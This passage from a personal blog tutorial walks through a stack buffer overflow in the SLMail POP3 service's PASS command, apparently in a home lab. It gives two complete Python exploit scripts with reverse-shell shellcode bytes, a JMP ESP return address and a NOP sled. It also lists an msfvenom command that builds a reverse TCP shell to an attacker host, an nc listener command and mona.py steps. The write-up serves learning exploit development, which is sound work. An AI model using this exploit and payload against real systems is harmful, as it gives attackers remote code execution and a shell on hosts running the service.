</span></span><span style="display:flex;"><span><span style="color:#75715e"># Victim IP and Port</span>
</span></span><span style="display:flex;"><span>host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;192.168.1.14&#34;</span>
</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">110</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># POC Buffer</span>
</span></span><span style="display:flex;"><span>junk <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4654</span>
</span></span><span style="display:flex;"><span>eip <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">=</span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xdb\xd9\xd9\x74\x24\xf4\x5f\x31\xc9\xb1\x52\xbd\xad</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x99\x49\x27\x31\x6f\x17\x83\xc7\x04\x03\xc2\x8a\xab</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd2\xe0\x45\xa9\x1d\x18\x96\xce\x94\xfd\xa7\xce\xc3</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x76\x97\xfe\x80\xda\x14\x74\xc4\xce\xaf\xf8\xc1\xe1</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x18\xb6\x37\xcc\x99\xeb\x04\x4f\x1a\xf6\x58\xaf\x23</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x39\xad\xae\x64\x24\x5c\xe2\x3d\x22\xf3\x12\x49\x7e</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc8\x99\x01\x6e\x48\x7e\xd1\x91\x79\xd1\x69\xc8\x59</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd0\xbe\x60\xd0\xca\xa3\x4d\xaa\x61\x17\x39\x2d\xa3</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x69\xc2\x82\x8a\x45\x31\xda\xcb\x62\xaa\xa9\x25\x91</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x57\xaa\xf2\xeb\x83\x3f\xe0\x4c\x47\xe7\xcc\x6d\x84</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7e\x87\x62\x61\xf4\xcf\x66\x74\xd9\x64\x92\xfd\xdc</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xaa\x12\x45\xfb\x6e\x7e\x1d\x62\x37\xda\xf0\x9b\x27</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x85\xad\x39\x2c\x28\xb9\x33\x6f\x25\x0e\x7e\x8f\xb5</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x18\x09\xfc\x87\x87\xa1\x6a\xa4\x40\x6c\x6d\xcb\x7a</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc8\xe1\x32\x85\x29\x28\xf1\xd1\x79\x42\xd0\x59\x12</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x92\xdd\x8f\xb5\xc2\x71\x60\x76\xb2\x31\xd0\x1e\xd8</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xbd\x0f\x3e\xe3\x17\x38\xd5\x1e\xf0\x87\x82\x21\x12</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x60\xd1\x21\x03\x2c\x5c\xc7\x49\xdc\x08\x50\xe6\x45</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x11\x2a\x97\x8a\x8f\x57\x97\x01\x3c\xa8\x56\xe2\x49</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xba\x0f\x02\x04\xe0\x86\x1d\xb2\x8c\x45\x8f\x59\x4c</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x03\xac\xf5\x1b\x44\x02\x0c\xc9\x78\x3d\xa6\xef\x80</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xdb\x81\xab\x5e\x18\x0f\x32\x12\x24\x2b\x24\xea\xa5</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x77\x10\xa2\xf3\x21\xce\x04\xaa\x83\xb8\xde\x01\x4a</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2c\xa6\x69\x4d\x2a\xa7\xa7\x3b\xd2\x16\x1e\x7a\xed</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x97\xf6\x8a\x96\xc5\x66\x74\x4d\x4e\x96\x3f\xcf\xe7</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x3f\xe6\x9a\xb5\x5d\x19\x71\xf9\x5b\x9a\x73\x82\x9f</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x82\xf6\x87\xe4\x04\xeb\xf5\x75\xe1\x0b\xa9\x76\x20</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Build exploit buffer out of the junk data (&#39;A&#39;s), eip address (&#39;B&#39;s), shellcode</span>
</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">=</span> junk <span style="color:#f92672">+</span> eip <span style="color:#f92672">+</span> buf
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Build a TCP SOCKET (stream) and use it to connect to victim IP &amp; Port</span>
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>connect((host, port))
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
</span></span><span style="display:flex;"><span>print(data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send USER command with Username x41</span>
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;USER x41</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
</span></span><span style="display:flex;"><span>print(data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send PASS command with our buffer</span>
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;PASS &#39;</span> <span style="color:#f92672">+</span> buffer <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
</span></span><span style="display:flex;"><span>print(data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Close connection</span>
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>close()</span></span></code></pre></div>
<p>
  <img src="poc-esp-register.png" alt="poc-esp-register" /></p>
<p>
  <img src="poc-esp-stack.png" alt="poc-esp-stack" /></p>
<p>We could write an address into &ldquo;EIP&rdquo; that leads to a <code>JMP ESP</code> or <code>CALL ESP</code> instruction. This indirect method avoids hard-coding a &ldquo;stack&rdquo; address that&rsquo;s constantly changing.
These instructions can be found in &ldquo;DLL&rsquo;s&rdquo; that the program or operating system ships.
Using the &ldquo;Windows DLL&rsquo;s&rdquo; is not always a good idea. The reason why you want to avoid &ldquo;Windows DLL&rsquo;s&rdquo; is because they have &ldquo;ASLR&rdquo; (Address-Space-Layout-Randomization) enabled.
This will prevent simple exploits like this because the <code>JMP ESP</code> instruction won&rsquo;t be at the same location every time. Try it with this &ldquo;exploit&rdquo; later on a &ldquo;Windows 10&rdquo; machine. It will work just fine until you reboot.</p>
<p>You can read a good explaination <a href="https://security.stackexchange.com/questions/157478/why-jmp-esp-instead-of-directly-jumping-into-the-stack" target="_blank">here</a>.</p>
<p>I wasn&rsquo;t able to find a way to avoid using a &ldquo;Windows DLL&rdquo; so far. For simplicity I just picked <code>SHELL32.dll</code>.
You click the &ldquo;E&rdquo; button in &ldquo;OllyDbg&rsquo;s&rdquo; toolbar and get a list of &ldquo;DLL&rsquo;s&rdquo;. Locate <code>SHELL32.dll</code> and double-click it.</p>
<p>Now right-click in the top-left pane and &ldquo;search for &hellip; Command&rdquo;. In that box you type <code>JMP ESP</code>.</p>
<p>
  <img src="jmp-esp.png" alt="jmp-esp" /></p>
<p>
  <img src="jmpesp-found.png" alt="jmpesp-found" /></p>
<p>Once found, we put that address into our &ldquo;exploit&rdquo; instead of the &ldquo;B&rsquo;s&rdquo;.</p>
<pre tabindex="0"><code>eip = b&#39;\x5C\xCB\xCE\x75&#39;
</code></pre><p>I formatted the address in the same &ldquo;hex-notation&rdquo; as the &ldquo;shellcode&rdquo; and also wrote the values backwards.
This is because INTEL CPU&rsquo;s are working in &ldquo;little endian&rdquo; format. Please check wikipedia for that. It&rsquo;s just which byte is the least significant one.</p>
<h1 id="nop">
  NOP
  <a class="anchor" href="#nop">#</a>
</h1>
<p>Adding <code>NOP</code>s is probably the easiest part.</p>
<pre tabindex="0"><code>nop = b&#39;\x90&#39; * 20
</code></pre><p><code>NOP</code> stands for &ldquo;no operation&rdquo;. The &ldquo;CPU&rdquo; just skips those and moves on. Using those makes the &ldquo;exploit&rdquo; a bit more reliable, because
after we <code>JMP ESP</code> we try to land into our <code>NOP</code>s and slide down into our &ldquo;shellcode&rdquo;. Just in case something moved on the &ldquo;stack&rdquo;.</p>
<h1 id="exploit">
  Exploit
  <a class="anchor" href="#exploit">#</a>
</h1>
<p>That&rsquo;s about it. Now comes the moment of truth. Did everything work out?
Let me show you the finished &ldquo;exploit&rdquo; and then if we can pop a shell.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Import of the socket library to connect to the POP3 service</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Victim IP and Port</span>
</span></span><span style="display:flex;"><span>host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;192.168.1.14&#34;</span>
</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">110</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># POC Buffer</span>
</span></span><span style="display:flex;"><span>junk <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4654</span>
</span></span><span style="display:flex;"><span>eip <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x5C\xCB\xCE\x75</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>nop <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">=</span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xdb\xd9\xd9\x74\x24\xf4\x5f\x31\xc9\xb1\x52\xbd\xad</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x99\x49\x27\x31\x6f\x17\x83\xc7\x04\x03\xc2\x8a\xab</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd2\xe0\x45\xa9\x1d\x18\x96\xce\x94\xfd\xa7\xce\xc3</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x76\x97\xfe\x80\xda\x14\x74\xc4\xce\xaf\xf8\xc1\xe1</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x18\xb6\x37\xcc\x99\xeb\x04\x4f\x1a\xf6\x58\xaf\x23</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x39\xad\xae\x64\x24\x5c\xe2\x3d\x22\xf3\x12\x49\x7e</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc8\x99\x01\x6e\x48\x7e\xd1\x91\x79\xd1\x69\xc8\x59</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd0\xbe\x60\xd0\xca\xa3\x4d\xaa\x61\x17\x39\x2d\xa3</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x69\xc2\x82\x8a\x45\x31\xda\xcb\x62\xaa\xa9\x25\x91</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x57\xaa\xf2\xeb\x83\x3f\xe0\x4c\x47\xe7\xcc\x6d\x84</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7e\x87\x62\x61\xf4\xcf\x66\x74\xd9\x64\x92\xfd\xdc</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xaa\x12\x45\xfb\x6e\x7e\x1d\x62\x37\xda\xf0\x9b\x27</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x85\xad\x39\x2c\x28\xb9\x33\x6f\x25\x0e\x7e\x8f\xb5</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x18\x09\xfc\x87\x87\xa1\x6a\xa4\x40\x6c\x6d\xcb\x7a</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc8\xe1\x32\x85\x29\x28\xf1\xd1\x79\x42\xd0\x59\x12</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x92\xdd\x8f\xb5\xc2\x71\x60\x76\xb2\x31\xd0\x1e\xd8</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xbd\x0f\x3e\xe3\x17\x38\xd5\x1e\xf0\x87\x82\x21\x12</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x60\xd1\x21\x03\x2c\x5c\xc7\x49\xdc\x08\x50\xe6\x45</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x11\x2a\x97\x8a\x8f\x57\x97\x01\x3c\xa8\x56\xe2\x49</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xba\x0f\x02\x04\xe0\x86\x1d\xb2\x8c\x45\x8f\x59\x4c</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x03\xac\xf5\x1b\x44\x02\x0c\xc9\x78\x3d\xa6\xef\x80</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xdb\x81\xab\x5e\x18\x0f\x32\x12\x24\x2b\x24\xea\xa5</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x77\x10\xa2\xf3\x21\xce\x04\xaa\x83\xb8\xde\x01\x4a</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2c\xa6\x69\x4d\x2a\xa7\xa7\x3b\xd2\x16\x1e\x7a\xed</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x97\xf6\x8a\x96\xc5\x66\x74\x4d\x4e\x96\x3f\xcf\xe7</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x3f\xe6\x9a\xb5\x5d\x19\x71\xf9\x5b\x9a\x73\x82\x9f</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x82\xf6\x87\xe4\x04\xeb\xf5\x75\xe1\x0b\xa9\x76\x20</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Build exploit buffer out of the junk data (&#39;A&#39;s), eip containing &#39;JMP ESP&#39;, NOPs and shellcode</span>
</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">=</span> junk <span style="color:#f92672">+</span> eip <span style="color:#f92672">+</span> nop <span style="color:#f92672">+</span> buf
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Build a TCP SOCKET (stream) and use it to connect to victim IP &amp; Port</span>
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>connect((host, port))
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
</span></span><span style="display:flex;"><span>print(data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send USER command with Username x41</span>
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;USER x41</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
</span></span><span style="display:flex;"><span>print(data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send PASS command with our buffer</span>
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;PASS &#39;</span> <span style="color:#f92672">+</span> buffer <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
</span></span><span style="display:flex;"><span>print(data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Close connection</span>
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>close()</span></span></code></pre></div>
<p>Before we run the &ldquo;exploit&rdquo; we start a &ldquo;nc listener&rdquo; to receive the &ldquo;reverse-shell&rdquo;.</p>
<p><code>nc -lnvp 4444</code></p>
<p>Now we run the &ldquo;exploit&rdquo;:</p>
<p>
  <img src="exploit-success.png" alt="exploit-success" /></p>
<p>And it worked! :)</p>
<p>In the next screenshot you can see how the &ldquo;stack&rdquo; and &ldquo;registers&rdquo; look like just one step before we jump into our <code>NOP</code>s.</p>
<p>
  <img src="exploit-ollydbg-final.png" alt="exploit-ollydbg-final" /></p>
<p>Can you spot the important sections? The <code>NOPs</code>? What address <code>ESP</code> and <code>EIP</code> hold? I leave that to you now.</p>
<p>I will try to make this exploit better over time (if possible) to challenge myself. I tried already with not using the <code>shell32.dll</code> but the &ldquo;DLL&rsquo;s&rdquo; I tried
didn&rsquo;t even had a <code>JMP ESP</code> or <code>CALL ESP</code> instruction in it. Don&rsquo;t know why. But that&rsquo;s why I learn, right?! ;)</p>
<h1 id="update-11">
  Update 1.1
  <a class="anchor" href="#update-11">#</a>
</h1>
<p>After uploading this entry I fixed a couple of typos and other errors.
But I also learned a couple of new tricks.</p>
<h3 id="no-crashes-anymore">
  No crashes anymore!
  <a class="anchor" href="#no-crashes-anymore">#</a>
</h3>
<p>When you create your shellcode and specify <code>EXITFUNC=thread</code> the threaded &ldquo;SLMail&rdquo; process won&rsquo;t crash completely when exiting the &ldquo;reverse-shell&rdquo;.</p>
<p><code>msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.1.18 LPORT=4444 -b '\x00\x0a\x0d' EXITFUNC=thread -f python</code></p>
<h3 id="jmp-esp-1">
  JMP ESP!
  <a class="anchor" href="#jmp-esp-1">#</a>
</h3>
<p>I played a bit with &ldquo;Immunity Debugger&rdquo; in combination with the extention &ldquo;mona.py&rdquo; instead of &ldquo;OllyDbg&rdquo;.
With &ldquo;mona.py&rdquo; I was able to find a <code>JMP ESP</code> in <code>SLMFC.dll</code> with this command:</p>
<p><code>!mona find -type instr -s &quot;jmp esp&quot; -m slmfc.dll</code></p>
<p>I was curious why &ldquo;mona&rdquo; was able to find 19! of those while the search I used, didn&rsquo;t. So I poked around and noticed that my old search
was done in an address space that differed from the ones where &ldquo;mona&rdquo; found the <code>JMP ESP</code> instructions.</p>
<p>So I think &ldquo;mona&rdquo; searches all sections, while the search command does not.</p>
<p>I was able to find the instruction manually in the <code>.rdata</code> section of the <code>.dll</code>.</p>
<p>
  <img src="jmpesp-found2.png" alt="jmpesp-found2" /></p>
<p>After updating and testing my exploit, I can say: It&rsquo;s working like a charm!
No crashing service anymore and it survives reboots now too.</p>
<p>Till next time.</p>
<p>x41</p>
<p>
  <a href="/#top">[Top]</a></p>
</article>
 
      

      <footer class="book-footer">
        
  <div class="flex flex-wrap justify-between">





</div>



  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>


 
        
      </footer>

      
  
 

      <label for="menu-control" class="hidden book-menu-overlay"></label>
    </div>

    
  </main>

  
</body>
</html>












